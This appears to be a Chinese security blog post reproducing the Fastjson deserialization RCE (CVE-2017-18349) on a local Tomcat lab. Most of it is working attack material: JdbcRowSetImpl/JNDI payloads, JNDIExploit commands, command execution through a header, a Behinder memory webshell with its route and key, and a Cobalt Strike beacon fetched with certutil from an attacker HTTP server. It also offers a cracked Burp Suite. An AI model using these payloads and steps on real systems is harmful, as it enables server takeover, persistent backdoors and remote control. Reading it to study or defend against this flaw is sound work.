#  FastJson-RCE (CVE-2017-18349) 漏洞复现   
原创 F0R  朱厌安全   2024-06-26 23:51  
  
0X01 环境搭建  
  
Java环境：JDK 8  
  
物理机环境：Windows 11  
  
Tomcat版本：8.5.0  
  
Maven版本：3.9.8  
  
IDEA版本：最新版本  
  
**漏洞验证工具**：burpsuite2024版本、JNDIExploit-1.4-SNAPSHOT.jar  (工具获取可发送关键字)  
  
**环境源码获取：公众号后台发送"****fastjson****"关键字即可**  
  
**burp2024版本破解版本获取：公众号后台发送"****burp2024****"关键字即可**  
  
**JNDIExploit-1.4工具获取：公众号后台发送"****jnditools1****"关键字即可**  
1. Idea打开源码文件夹，配置maven(上篇文章有讲)  
  
1. 配置jdk环境  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcvZiazMrtgS4mfDNNYFINcgKNjDr32rvLxajMn4XZichpqJTVDHTCJP5g/640?wx_fmt=png&from=appmsg "")  
1. 刷新maven  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcGicRcdm4EK1lrguSblZaicZHALconIP5IDsr0QYvWy21YpUZVLHYL5SQ/640?wx_fmt=png&from=appmsg "")  
1. 启动项目(这里我使用的8081端口，修改端口可以在  
application.properties文件修改)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcBmqcZwouQsHkw7Nq3nHeCgMA7vprw8dOplz9gbibXcTic3JZgW2mIfibA/640?wx_fmt=png&from=appmsg "")  
1. 启动成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmc3g51xe0RvL9QicGezIE5manwbGzy9A8Ct5kiafgYkM4KNrCrSmINFZtg/640?wx_fmt=png&from=appmsg "")  
# 0X02 漏洞复现  
  
打开burp进行抓包，发送到重发器  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcgMIYnFkGdHKjcrgggouSKVvwS6tiaHicicqXVw4uaA6YtZrsTLX4H8ubw/640?wx_fmt=png&from=appmsg "")  
  
修改为POST请求方式  
  
构造json数据验证是否运行正常，这里需要注意，application/json、POST请求、Json请求体  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcNv0IrEEdZwJEZcKcV0O0AGfnHH6OXDfr85TCR0h7aQRvoB98Is9ghA/640?wx_fmt=png&from=appmsg "")  
  
运行正常，下面测试漏洞  
  
查看是否存在fastjson特征  
  
payload:  
```
{"b":{"@type": "java.lang.AutoCloseable","autoCommit":true}}
```  
  
  
可以看到 com.alibaba.fastjson 特征  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmc5IdggnZtFUtL1siatuww7zHic3F92akFfDwj5sjGW3V5SqoiadIGFsFCQ/640?wx_fmt=png&from=appmsg "")  
  
测试是否存在fastjson漏洞  
  
payload：  
```
{"a": {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b": {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"exp","autoCommit":true}}
```  
  
  
这里使用到了JNDIExploit-1.4-SNAPSHOT.jar工具 (jdk8启动)  
  
命令：  
```
java -jar JNDIExploit-1.4-SNAPSHOT.jar -u -i 127.0.0.1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmc3pIzE28cSIXoMYtyW48D3xJC4p2zMjEH9BDiarJkupITOyIicZUNMYTA/640?wx_fmt=png&from=appmsg "")  
  
具体参数是什么用处可以百度  
  
启动 JNDIExploit-1.4-SNAPSHOT.jar 工具  
  
命令：  
```
java -jar JNDIExploit-1.4-SNAPSHOT.jar -
i 127.0.0.1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmchibxdbBNdDyiamY8iaiaicooeDbg9CufZmcO5zEXdFWxqLlLrMSHluhR83A/640?wx_fmt=png&from=appmsg "")  
  
使用工具提供payload：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcjPNqibeibcPQjVUVuCJU4ejj8WEFxCN5v0hyQmXcssm7cUPvsHIkFEicw/640?wx_fmt=png&from=appmsg "")  
```
ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmc7FtNeSdkV9oKnPj4Jjf4XmLSmafRbx5iap1IsF01P2w4OHkEWLYnRtQ/640?wx_fmt=png&from=appmsg "")  
```
{"a": {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b": {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho","autoCommit":true}}
```  
  
hander添加字段：cmd: whoami  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcCrX9wbMxILRF1hRKNpNB9K1MWTtRaoe10K7aicnicDnUwQG9shfcA1pg/640?wx_fmt=png&from=appmsg "")  
  
点击burp "send"发送数据包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcFyxqwRFyibwVHoT4LgxKa7waCByzeLZ4pTmIs9mWB4meNyg23gKPkqw/640?wx_fmt=png&from=appmsg "")  
  
漏洞利用完成  
# 0X03 注入冰蝎内存马  
  
使用jndi payload：  
```
ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell3
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcaXp8VGbyYdoibqVmbb8FHf2qk0ricPn9jbuP8ByVtdEjdlrCJ7FZxIJw/640?wx_fmt=png&from=appmsg "")  
  
发包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcKP2xm0o9DPndvk2mR2nduzjID6TRAZS1JHEBufKdLYxbR1UZNia4wSA/640?wx_fmt=png&from=appmsg "")  
  
冰蝎连接  路由：/ateam  key：pass1024  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcsp1kUXVCoxGk1RLYWouVZTwsmM6qCpnmHKicpN5aWchy3icA2EdvEU8A/640?wx_fmt=png&from=appmsg "")  
  
漏洞利用成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcRYt4MsfHRibydZRlpQGMcOJH1RxiaMEQpKBOCMmzoCLZ5DoFLA1r178w/640?wx_fmt=png&from=appmsg "")  
# 0X04  上线CS  
  
CS版本：4.7 (**注意**远程VPS使用版本和客户端要一致)  
  
远程VPS：本地虚拟机 kali  
  
本地虚拟机启动cs teamserver (模拟远程VPS端)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcc1O78SJdKMLeEZ4sGf8IHlRlZJicA6MrkiajskXOMewQ6ac40zX4xBSA/640?wx_fmt=png&from=appmsg "")  
  
本地物理机开启CS客户端（模拟攻击者机器）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcQjCtE5lYTe5Mm1CejlpyPnr55Vw4VHF1LDoJCof6Bu5VrXjic2jw8jQ/640?wx_fmt=png&from=appmsg "")  
  
新建监听器  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmc97G8moAeeTXmMoSaS8JQvRVdM04lg0uDWTfDwVBgwSfc4JRtQEEa8A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmc1ArbicVAqaVcWUlWuVJpP2l6LUtmHibUWiaONJ9CJOVN4kpcYhsPwVgfg/640?wx_fmt=png&from=appmsg "")  
  
生成exe马  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcBEBBkHic216PuVwlgrFA9bGnBknC5qkATX7mKuc0MjEHa46ebHbcnag/640?wx_fmt=png&from=appmsg "")  
  
配置监听器，保存至桌面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcNDWcPuPR8nlXM1nAfllk3xvy4Aaqgx5ibXFD2xheibqDYZ36uCwm0owg/640?wx_fmt=png&from=appmsg "")  
  
将生成exe马上传至远程VPS (这里我是kali虚拟机)，远程VPS启动http服务(这里是为了后面受害机器远程下载恶意文件)  
  
命令：  
```
python3 -m http.server 启用端口
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmc77jpVQw0MqnTCfS4BLVHO9icc8VfHcjj29UQx7ibV50Qj5u4icmIczHxQ/640?wx_fmt=png&from=appmsg "")  
  
执行Windows命令使受害机器远程下载恶意文件至指定目录  
  
命令：  
```
certutil -urlcache -split -f 远程地址 指定本地下载文件存放地址
```  
  
jndi工具的payload仍然为  
```
ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho
```  
  
此时JNDI工具仍开启状态  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcxdvgicpicWB9eRoJDnYBDM9qQQSeNU1O7IibCFUQEupB8RxlKUU729AnA/640?wx_fmt=png&from=appmsg "")  
  
burp构造exp，发包，远程下载成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcG51IM1Tu6mgibqvibibNlzSxzvmRz5KFTsmBRILLOrTtRmaoHicj1yb0bg/640?wx_fmt=png&from=appmsg "")  
  
执行1.exe，上线CS  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmc6vYyh7XVqLWgQoEdwf7t59icNYln3uiaV4HK5akcU8TSETLmwSwfu5Ig/640?wx_fmt=png&from=appmsg "")  
  
返回CS，上线成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmcpQcic0sRINmkr9ERfaET78WqThebT4sq9tzjxUWHRbI5gQUK65TUfjw/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dcfALm4W0M9AQDW2icgrqSNjU9KiclqMmc9HUEMmibxN65j2aib1icek64QicUl5xvSPcvCKWC6TibVdicYjicf2p1xs6tQ/640?wx_fmt=png&from=appmsg "")  
  
  
                                                              
   
梦想再多，努力实现就是了  
  
